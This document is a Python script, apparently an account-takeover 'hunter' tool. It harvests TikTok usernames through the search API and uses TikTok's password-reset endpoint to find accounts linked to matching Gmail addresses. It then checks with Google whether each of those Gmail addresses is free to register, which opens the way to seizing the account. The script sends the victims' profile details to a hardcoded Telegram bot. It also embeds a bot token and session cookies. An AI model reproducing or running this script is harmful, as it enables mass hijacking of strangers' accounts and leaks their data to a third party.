from rich import print 
from rich.panel import Panel
from faker import Faker

try:
	import requests,os,random
	from user_agent import generate_user_agent
	from uuid import uuid4
	import socket
	import webbrowser
	import threading
	import sys
	import json
	import secrets
except:
	os.system("pip install requsets")
	os.system("pip install json")
	os.system("pip install rich")
	os.system("pip install faker")
	os.system("pip install names")
	os.system("pip install user_agent")
	os.system("pip install uid")
	os.system("pip install uuid")
	os.system("pip install webbrowser")
	os.system("pip install socket")
	os.system("pip install threading")
	os.system("clear")
os.system('clear')

sessionid="{}".format(str(secrets.token_hex(8) * 2))
header = {"User-Agent": 'Mozilla/5.0 (Linux; Android 10; Lenovo K12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}

r1991=requests.get('https://www-useast1a.tiktok.com/passport/web/user/login/?',headers=header).cookies.get_dict()['passport_csrf_token']
os.system('clear')
print('')
ugen,viv=[],[]
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
import requests,os,random
from user_agent import generate_user_agent
from uuid import uuid4
import socket
import webbrowser
import threading
import sys,re
import json
from urllib.parse   import urlencode, quote
from random         import randint, choice
#-------------------#
Z = '\033[1;31m' 
X = '\033[1;33m' 
F = '\033[2;32m' 
C = "\033[1;97m" 
GJ = '\033[2;36m'
Y = '\033[1;34m' 
C = "\033[1;97m" 
E = '\033[1;31m'

AB_A="\033[1;97m" # ابيض خط عربض
RS='\033[30m' #رصاصي
AH_F='\033[31m'   #احمر فاتح
AKH_F='\033[32m' #اخضر فاتح
AS_T='\033[33m'#اصفر طوخ
SM='\033[34m'  #سمائي
BN='\033[35m'#بنفسجي
AZ_T='\033[36m'  #ازرك طوخ
AB_KH='\033[37m' #ابيض خط خفيف
AH_T='\033[91m'  #احمر طوخ
AKH_T='\033[92m'#اخضر طوخ
AS_F='\033[93m'    #اصفر فاتح
WR='\033[95m'      #وردي
B = '\x1b[38;5;208m' #برتقالي
AH2 = '\x1b[38;5;204m' 
AS2 = '\x1b[38;5;220m'
MJ = '\x1b[38;5;193m'
MJ2 = '\x1b[38;5;216m'
MJ3 = '\x1b[38;5;190m'
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
MJ4 = '\x1b[38;5;106m'
#-------------------#
os.system('clear')
ID= (f'5708311976')

tok=(f'6491191766:AAHC9oq7tPfwsEtIv2isSNI93JaZFJ4TS60')
os.system('clear')


BA=0
CP=0
OK=0



def telegram(email):
	username=email.split('@gmail.com')[0]
	response = requests.get(f'https://www.tiktok.com/@{username}')
	patrek = response.text
	getting = str(patrek.split('"UserModule":')[1]).split('"RecommendUserList"')[0]
	id = str(getting.split('id":"')[1]).split('",')[0]
	name = str(getting.split('nickname":"')[1]).split('",')[0]
	bio = str(getting.split('signature":"')[1]).split('",')[0]
	country = str(getting.split('region":"')[1]).split('",')[0]
	verified = str(getting.split('"verified":')[1]).split(',')[0]
	secuid = re.search(r'"secUid":"(.+?)"', patrek).group(1)
	followers = str(getting.split('followerCount":')[1]).split(',"')[0]
	following = str(getting.split('followingCount":')[1]).split(',"')[0]
	like = str(getting.split('heart":')[1]).split(',"')[0]
	video = str(getting.split('videoCount":')[1]).split(',"')[0]

	
	
	tlg = f'''
───────────────
ᴜѕᴇʀɴᴀᴍᴇ ➢ {username}
ɴᴀᴍᴇ ➢ {name}
ғᴏʟʟᴏᴡᴇʀѕ ➢ {followers}
ғᴏʟʟᴏᴡɪɴɢ ➢ {following}
ʟɪᴋᴇ ➢ {like}
ᴠɪᴅᴇᴏ ➢ {video}
sᴇᴄᴜɪᴅ ➢ {secuid}
ʙɪᴏɢʀᴀᴘʜʏ ➢ {bio}
ᴄᴏᴜɴᴛʀʏ ➢ {country}
───────────────
[ JOPA ] @J_O_P_A_4
		'''
	
	
	from rich import print 
	from rich.panel import Panel
	ti = '[i][bold green]JOPA[/bold green][/i]'
	te = f'[green] '
	print(Panel(te,title=ti))
	requests.get("https://api.telegram.org/bot"+str(tok)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg))
	
	
	
def gmail(email):
	global fc,fj,OK,CP,BA
	eml=str(email)
	email=eml.split('@')[0]+'@gmail.com'
	url = 'https://android.clients.google.com/setup/checkavail'
	h = {
		'Content-Length':'98',
		'Content-Type':'text/plain; charset=UTF-8',
		'Host':'android.clients.google.com',
		'Connection':'Keep-Alive',
		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
		}
	d = json.dumps({
		'username':email,
		'version':'3',
		'firstName':'SIN',
		'lastName':'TOOLS'
	})
	res = requests.post(url,data=d,headers=h)
	if res.json()['status'] == 'SUCCESS':
		OK+=1
		
		sys.stdout.write('\r [ JOPA ]\033[2;32mOK(%s) \033[1;33mCP(%s)\033[1;31m BAD(%s) EMAIL : %s  \r'%(OK,CP,BA,email)),sys.stdout.flush()
		telegram(email)
			    
		

	else:
	    CP+=1
	 
	    sys.stdout.write('\r [ JOPA ]\033[2;32mOK(%s) \033[1;33mCP(%s) \033[1;31mBAD(%s) EMAIL : %s  \r'%(OK,CP,BA,email)),sys.stdout.flush()
	    

	 
	 
def tiktok(email):
 global hc,hj,OK,CP,BA
 email=str(email)
 email=email+"@gmail.com"
 url = 'https://api2-19-h2.musical.ly/aweme/v1/passport/find-password-via-email/?app_language=ar&manifest_version_code=2018101933&_rticket=1667149902064&iid=7160349471136909061&channel=googleplay&language=ar&fp=&device_type=ANY-LX2&resolution=1080*2298&openudid=39e9b96bb5c6e336&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=480&carrier_region=IQ&ac=wifi&device_id=7116197109661091333&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HONOR&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233&ts=1667149902&as=a1261b755ea4d3e04e4388&cp=be4a3c6ce5e8520fe1MkUo&mas=0149d8edb9a3340aacd5c82fcadadde3801c1ccc2ca62c0ca6cc26'
 
 headers = {
'Host': 'api2-19-h2.musical.ly',
'Connection': 'keep-alive',
'Content-Length': '647',
'Cookie': 'odin_tt=b0db11ac4955afa4589bdb09d8f8fdcf3bcdea5238d0a6e2ba7c6aaea542e8d4ff9a3f324c153df80e03ac5e29a9d411925fa05d2f300713a2295db1eeff68accf50d5ddb5abd11115077fe989cfc094; store-idc=maliva; store-country-code=iq; store-country-code-src=did',
'Accept-Encoding': 'gzip',
'X-SS-QUERIES': 'dGMCAr6ot3awALq2qSjedy1Vk99nIoud%2BAhHSPAsj5dyUWFbxRx0wm95EoKwwNB3VVlOMd4SzMIENA51cwBS%2Bm0N1T95yguPVZ4OunAWAs0t0bHbsPclnVdl1Uh%2BLGZVXFGTew%3D%3D',
'sdk-version': '1',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'X-SS-TC': '0',
'User-Agent': 'com.zhiliaoapp.musically/2018101933 (Linux; U; Android 11; ar_IQ_#u-nu-latn; ANY-LX2; Build/HONORANY-L22CQ; Cronet/58.0.2991.0)'
}


 data = (f'app_language=ar&manifest_version_code=2018101933&_rticket=1667150564079&iid=7160349471136909061&channel=googleplay&language=ar&fp=&device_type=ANY-LX2&resolution=1080*2298&openudid=39e9b96bb5c6e336&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=480&email={email}&retry_type=no_retry&carrier_region=IQ&ac=wifi&device_id=7116197109661091333&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HONOR&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233')

 rr = requests.post(url, headers=headers, data=data).text

 if 'Sent successfully' in rr:
 	sys.stdout.write('\r [ JOPA ]\033[2;32mOK(%s) \033[1;33mCP(%s) \033[1;31mBAD(%s) EMAIL : %s  \r'%(OK,CP,BA,email)),sys.stdout.flush()
 	gmail(email)
 	
 
 else:
   BA+=1
   
   sys.stdout.write('\r [ JOPA ]\033[2;32mOK(%s) \033[1;33mCP(%s) \033[1;31mBAD(%s) EMAIL : %s \r'%(OK,CP,BA,email)),sys.stdout.flush()
   

   
      
                   

def sr():
	faker=Faker('ru_RU')
	while True:
		try:
                  header = {"User-Agent": 'Mozilla/5.0 (Linux; Android 10; Lenovo K12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
                  msToken=requests.get('https://www-useast1a.tiktok.com/passport/web/user/login/?',headers=header).cookies.get_dict()['msToken']
                  ttwid=requests.get('https://www.tiktok.com/',headers=header).cookies.get_dict()['ttwid']
		except:
				pass
				sr()
		try:
			countr = ['KW','SA','IN','EG','IR','YE','IQ','AE','AG','AR','AT','RU',
                                                            'AU','AW','BB','BD','BE','BF','BG','GT','GY','HK','HN','HR','HT',
                                                            'HU','ID','IE','IL','BH','BJ','BM','BN','BR','IT','JP','LR','DE','LY','YE','US',
'IT','TT','SV','CZ','BE','CO','TW','HN','EC','SK','NP','RS','NI','SE','GT','CL','NL','RO','HS','VE','AT','PL','PA','BO','GM','PT','US','AS','GU','MP','PR','VI','UM']
			country=choice(countr)
			pro = random.choice(ugen)
			rng=int("".join(choice('456789')for i in range(1)))
			user='qwertyuiopas.dfghjklzxcvbnm'
			#name=faker.user_name()
			name=str("".join(random.choice(user)for i in range(rng)))
			params = urlencode({
'aid'               :	1988,
'app_language'      :	'en',
'app_name'          :	'tiktok_web',
'battery_info'      :	'0.6',
'browser_language'  :	'en',
'browser_name'      :	'Mozilla',
'browser_online'    :	'true',
'browser_platform'  :	'Win32',
'browser_version'   :	'5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
'channel'           :	'tiktok_web',
'cookie_enabled'    :	'true',
'device_id'         :	randint(6999999999999999999, 7122222222222222222),
'device_platform'   :	'web_pc',
'focus_state'       :	'true',
'from_page'         :	'user',
'history_len'       :	'3',
'is_fullscreen'     :	'false',
'is_page_visible'   :	'true',
'os'                :	'windows',
'priority_region'   :	f'{country}',
'referer'           :	'',
'region'            :	f'{country}',
"screen_height"     :   randint(777, 888),
"screen_width"      :   randint(1333, 1666),
'tz_name'           :	'Europe/London',
'keyword'         :	name,
'webcast_language'  :	'en',
})
			u=f'https://www.tiktok.com/api/search/user/full/?{params}'

			h={'Cookie':'ttwid='+ttwid+'; tiktok_webapp_theme=light; msToken=2cFfY83w7ZYqeJfgSrtprxuGTSGt6Gc0eDwFbgXg9X2H9QKDvqyP84CCl5rQLohHqsWmMbFe6wbNEP8-opBSk0lOsyjuzONVAKvkGqzDSqpjF06wiD6q7dttLj8SXD1G3Hrp; ttwid='+ttwid+'; passport_csrf_token='+r1991+'; passport_csrf_token_default='+r1991+'; uid_tt=586f8c5249e9ca4373252f9eee8e7c83c9d67acce516a2f60263e96bd2d05513; uid_tt_ss=586f8c5249e9ca4373252f9eee8e7c83c9d67acce516a2f60263e96bd2d05513; sid_tt='+sessionid+'; sessionid='+sessionid+'; sessionid_ss='+sessionid+'; sid_ucp_v1=1.0.0-KDM4Mzc5NGVjZjZiMTI2YmMwNDliMWZhYTFiZjRmNDQzYjBhMTFmNDkKIAiCiKiSlOmvu2MQgeeEoQYYswsgDDD3_tqbBjgBQOoHEAMaBm1hbGl2YSIgZDI2MTYzZjY4ZTZjOTVkNDljMDNlYzdmNzJkNzAwN2Q; ssid_ucp_v1=1.0.0-KDM4Mzc5NGVjZjZiMTI2YmMwNDliMWZhYTFiZjRmNDQzYjBhMTFmNDkKIAiCiKiSlOmvu2MQgeeEoQYYswsgDDD3_tqbBjgBQOoHEAMaBm1hbGl2YSIgZDI2MTYzZjY4ZTZjOTVkNDljMDNlYzdmNzJkNzAwN2Q; store-idc=maliva; store-country-code=tr; store-country-code-src=uid; tt-target-idc=useast1a; tt-target-idc-sign=cQMNfSjvvlNBGrwBOVqQa00_v09uRkDCThX0h3WaTo3QkciqJxdiEQWfUogQifipphJ2Ew8lBPW5swp2QVAyQLMcRUZM7pXPh0HyaHO8KrEiK9A3hSGZBZxSEAtjUhUMDQUDKDoC0cR0zeg-w2kkEIzXQLMsCGEMP93BoNLamPReCgAQrzLXVcgIYxWPpL5a-6aGuB43e42MWOqeJ5YSA9r0Un4DqveL_K1-LXhXjSwcnPfR6vF53zPExkDb2QMG0jvHTef2Y-aXwqVhDrmc22wJAL5bMgEqtWhsdetK292OW6-_yY0vNW4FeADvZClor00lmXAXqgknfgEXkqbWe8oDu4o4-WTVM8Y0YMAJeS7RJkEW_2Di7V1o17gI8-dYhyE7Zi_Gm9junoMOnpbye8K-E1Tr6NEmp-ceoY1_ic6BewgUoVNqe3A6sYigbBydUam2obTHgrQgOD0Qss3TjvigPlTsC8DrE9DXhiSqAe-dCSnuEL_2tbfXt433ZkPE; tt_csrf_token=PSOxiSio-0SwWbZDgx1udkrvw10E6D869hY4; tt_chain_token=xzQFbQnJcDXq3OHhlmhPQA==; __tea_cache_tokens_1988={%22_type_%22:%22default%22%2C%22user_unique_id%22:%227215088339640649222%22%2C%22timestamp%22:1679893715575}; passport_fe_beating_status=true; csrf_session_id=3f2907b98fa47d37c429fe3249297a97; msToken='+msToken+'',
                        'User-Agent':pro}
			r=requests.get(u,headers=h).json()
			dofla = r['user_list']
			for ggg in dofla:
				g=str(ggg['user_info']['unique_id'])
				if '_' in g:
					pd=''
				else:
					tiktok(g)

		except:
				pass
				sr()
import threading
Dofl=[]
for i in range(9):
	       t = threading.Thread(target=sr)
	       t.start()
	       Dofl.append(t)
